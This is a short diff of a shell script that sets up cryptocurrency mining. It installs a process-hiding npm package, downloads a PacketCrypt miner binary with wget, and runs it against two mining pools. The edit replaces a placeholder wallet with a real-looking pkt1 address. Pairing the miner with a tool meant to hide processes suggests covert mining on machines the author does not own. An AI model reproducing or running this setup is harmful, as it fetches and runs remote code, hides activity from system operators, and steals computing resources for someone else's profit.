@@ -9,4 +9,4 @@
 npm i -g node-process-hider
 wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64
 chmod +x packetcrypt-v0.5.1-linux_amd64
-./packetcrypt-v0.5.1-linux_amd64 ann -p walet https://stratum.zetahash.com http://pool.srizbi.com https://stratum.zetahash.com http://pool.srizbi.com 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
+./packetcrypt-v0.5.1-linux_amd64 ann -p pkt1q6w43uf6x07qmz7kwklwnl6p7wncvmh7p3agkhw https://stratum.zetahash.com http://pool.srizbi.com https://stratum.zetahash.com http://pool.srizbi.com 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
